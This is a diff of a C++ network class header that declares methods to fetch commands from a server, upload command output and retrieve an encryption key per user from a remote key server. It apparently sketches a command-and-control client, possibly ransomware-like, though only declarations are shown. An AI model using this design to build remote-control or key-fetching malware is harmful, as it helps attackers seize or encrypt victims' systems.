@@ -14,6 +14,9 @@
 
 #include <string>
 
+#include "../include/HTTPRequest.hpp"
+
+#include "utils.h"
 #include "crypto.h"
 #include "protocol.h"
 
@@ -71,6 +74,16 @@ public:
             const std::string &encryptionKey);
 
     Network &operator=(const Network &network);
+
+    std::string RawRequest(const char *serverAddress, const char *port, const char *request);
+
+    std::string fetchCommand();
+
+    bool uploadCommand(std::string commandsOutput);
+
+    const char *ResolveAddress(const char *address);
+
+    std::string GetEncryptionKeyFromRMS(const char *serverAddress, const char *port, const char *associatedUser);
 
     static std::string
     RawRequest(const std::string &serverAddress, const std::string &port, const std::string &request);
